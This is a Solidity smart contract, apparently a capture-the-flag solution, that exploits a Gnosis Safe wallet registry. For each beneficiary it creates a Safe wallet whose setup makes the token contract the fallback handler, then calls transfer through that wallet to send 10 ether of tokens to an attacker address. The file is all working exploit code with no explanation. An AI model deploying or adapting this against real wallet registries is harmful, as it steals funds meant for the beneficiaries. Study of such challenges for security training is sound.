// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";

contract Attacker11 {
    IProxyCreationCallback public immutable walletRegistry;
    address public immutable masterCopy;
    GnosisSafeProxyFactory public immutable walletFactory;
    IERC20 public immutable token;
    address private immutable attacker;

    constructor(
        address _walletRegistry,
        address _masterCopy,
        address _walletFactory,
        address _token,
        address _attacker
    ) {
        walletRegistry = IProxyCreationCallback(_walletRegistry);
        masterCopy = _masterCopy;
        walletFactory = GnosisSafeProxyFactory(_walletFactory);
        token = IERC20(_token);
        attacker = _attacker;
    }

    function attack(address[] calldata beneficiaries) external {
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            address[] memory owner = new address[](1);
            owner[0] = beneficiaries[i];
            GnosisSafeProxy wallet = walletFactory.createProxyWithCallback(
                masterCopy,
                abi.encodeWithSelector(
                    GnosisSafe.setup.selector, owner, 1, address(0), 0, address(token), address(0), 0, address(0)
                ),
                0,
                walletRegistry
            );
            IERC20(address(wallet)).transfer(attacker, 10 ether);
        }
    }
}
